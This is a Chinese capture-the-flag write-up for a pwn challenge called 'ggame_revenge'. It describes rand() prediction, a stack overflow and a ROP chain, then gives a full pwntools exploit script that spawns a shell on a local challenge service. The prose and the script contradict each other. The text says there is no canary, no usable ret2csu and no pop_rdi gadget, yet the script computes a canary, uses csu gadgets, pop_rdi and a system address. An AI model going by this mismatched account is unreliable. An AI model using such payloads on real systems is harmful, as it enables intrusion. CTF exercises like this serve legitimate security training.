# ggame_revenge

考点：栈溢出，伪随机数预测,无泄漏ROP

题目没有开canary，pie，题目环境Ubuntu21.10，ret2csu不能用，程序只有两处花指令，patch后可正常反编译，



程序很明显只有栈溢出漏洞，但是触发条件是要预测出rand()的值：

```c
                }else if(inputnum==magicnum){
                    flag = 1;
                    printf("get it,you win!\n");
                    oa;
                    read(0,mmmery,0x100); //over stack
                    break;
                }
```
程序没有system，所以需要泄露libc，但是找不到pop_rdi的rop，所以可以通过将栈迁移到bss，重新调用程序，在bss段上留下libc_start_main的地址，之后通过rop：`add dword ptr [rbp - 0x3d], ebx ; nop ; ret`将该libc地址改为onegadget即可（也可以改为pop_rdi，之后泄露libc）

程序的花指令部分提供了三个gedget来供使用，所以在patch花指令的时候，不要将gadget patch掉。



```asm
.text:0000000000401534 loc_401534:                             ; CODE XREF: .text:000000000040153A↓j
.text:0000000000401534                 mov     ax, 0DEBh
.text:0000000000401538                 xor     eax, eax
.text:000000000040153A                 jz      short near ptr loc_401534+2
.text:000000000040153A ; ---------------------------------------------------------------------------
.text:000000000040153C                 db 0E8h
.text:000000000040153D ; ---------------------------------------------------------------------------
.text:000000000040153D                 pop     rsi
.text:000000000040153E                 retn
.text:000000000040153E ; ---------------------------------------------------------------------------
.text:000000000040153F                 db 0E8h
.text:0000000000401540 ; ---------------------------------------------------------------------------
.text:0000000000401540                 pop     rbx
.text:0000000000401541                 retn
.text:0000000000401541 ; ---------------------------------------------------------------------------
.text:0000000000401542                 db 0E8h
.text:0000000000401543 ; ---------------------------------------------------------------------------
.text:0000000000401543                 pop     rdx
.text:0000000000401544                 retn
.text:0000000000401544 ; -----------------------------
  
```

伪随机数预测方法：`o[n] == o[n-31] + o[n-3]`或`o[n] == o[n-31] + o[n-3] + 1`
可以预测出canary和下一次rand的值，然后rop即可拿到shell。


## 利用流程

1. 玩游戏随机数预测，计算下一次的rand值
2. 将栈迁移到bss，在bss段留下libc地址
3. 将libc地址改成onegadget地址
4. 通过预测的rand值触发栈溢出
5. 通过栈溢出rop返回到onegadget，获得shell


## exp

随机数存在随机性，多次尝试
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]

io = remote('127.0.0.1',49154 )
# libc = ELF('./libc-2.31.so')
# io = process('./ggame')
context.arch = "amd64"
elf = ELF('./ggame')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) 
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload
randnum = [0]*2
mycanary = 0
mycanary1 = 0
# ru("canary:")
# mycanary = int(ru("\n"),16)
# lg("mycanary")
# ru("r1:")
# r1 = int(ru("\n"),16)
# ru("r2:")
# r2 = int(ru("\n"),16)
csu_end_addr = 0x4016EA
csu_front_addr = 0x4016D0
bss = 0x4040A0 + 0x100
for i in range(31):
    sla("guess number?[y/n]",'y')
    sla("guess[0]: ","\n")
    sla("guess[1]: ","\n")
    sla("guess[2]: ","\n")
    sla("guess[3]: ","\n")
    sla("guess[4]: ","\n")
    sla("guess number?[y/n]",'6')
    sla("Give Up? [y/n]",'y')
    ru("the number is ")
    randnu = int(ru("\n"),16)
    lg("randnu")
    randnum.append(randnu)
    sla("continue guess? [y/n]",'y')
#o[n] == o[n-31] + o[n-3] 
randnum[0] = (randnum[31]-randnum[28])&0x7FFFFFFF #n=31
randnum[1] = (randnum[32]-randnum[29])&0x7FFFFFFF #n=32
randnum.append((randnum[2]+randnum[33-3])&0x7FFFFFFF) #n=33
print(randnum,len(randnum))
mycanary1 = (((randnum[0]^0xdeadbeefdeadbeef)&0xFFFFFFFF)<<32)+randnum[1]
# lg("mycanary")
# lg("r1")
# lg("r2")
systemaddr = 0x401110
pop_rdi = 0x00000000004016f3
lg("mycanary1")
sla("guess number?[y/n]",'y')
sla("guess[0]: ",str(randnum[33]))

pay = 'a'*0x48 + p64(mycanary1) + p64(1) 
pay += p64(csu_end_addr)
pay += p64(0) + p64(1) + p64(0) + p64(bss) + p64(0x20) + p64(elf.got['read']) 
pay += p64(csu_front_addr)
pay += '\x00' * 0x38
pay += p64(pop_rdi) + p64(bss) + p64(systemaddr)
#dbg()
sla('you win!\n',pay)
#pause()
sl('/bin/sh\x00')
irt()


```
